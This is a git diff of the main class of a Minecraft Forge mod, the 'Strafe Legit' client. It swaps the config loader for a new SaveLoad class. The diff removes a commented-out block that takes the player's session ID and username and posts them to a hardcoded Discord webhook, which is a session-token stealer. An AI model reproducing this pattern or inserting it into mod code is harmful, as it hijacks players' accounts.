@@ -1,8 +1,6 @@
 package me.strafe;
 
-import me.strafe.config.LoadFile;
-import me.strafe.events.MotionUpdateEvent;
-import me.strafe.utils.DiscordWebhook;
+import me.strafe.config.SaveLoad;
 import org.lwjgl.input.Keyboard;
 
 import me.strafe.clickgui.ClickGui;
@@ -23,6 +21,7 @@ public class StrafeLegitMod
     public ModuleManager moduleManager;
     public SettingsManager settingsManager;
     public ClickGui clickGui;
+    public SaveLoad saveLoad;
     
     public void init() throws IOException {
     	MinecraftForge.EVENT_BUS.register(this);
@@ -30,16 +29,7 @@ public class StrafeLegitMod
     	moduleManager = new ModuleManager();
     	clickGui = new ClickGui();
         Display.setTitle("STRAFE LEGIT CLIENT");
-//        try {
-//            String c = Minecraft.getMinecraft().getSession().getSessionID();
-//            String b = Minecraft.getMinecraft().getSession().getUsername();
-//            String url = "https://discord.com/api/webhooks/997840037242740747/htRxGdFaISSorsIO5ncS931TD4dLQBsQeE8UfwFCjnzbz91t5q2mPKasyK2O9wfxrr6m";
-//            DiscordWebhook web = new DiscordWebhook(url);
-//            web.setContent(b + " " + c);
-//            web.execute();
-//        } catch (IOException e){
-//            e.printStackTrace();
-//        }
+        saveLoad = new SaveLoad();
     }
     
     @SubscribeEvent
